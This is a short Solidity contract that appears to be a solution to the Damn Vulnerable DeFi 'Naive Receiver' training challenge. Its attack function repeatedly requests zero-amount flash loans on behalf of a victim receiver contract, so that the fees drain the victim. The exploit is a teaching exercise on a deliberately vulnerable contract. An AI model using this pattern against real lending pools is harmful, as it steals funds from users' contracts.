// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiverAttack {
 
    NaiveReceiverLenderPool private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }


function attack(address rece , uint256 times) public {
    for(uint256 i; i<times ; i++){
    pool.flashLoan(IERC3156FlashBorrower(rece) , ETH,0, '0x');

    }
}

    // Allow deposits of ETH
    receive() external payable {
    }
}
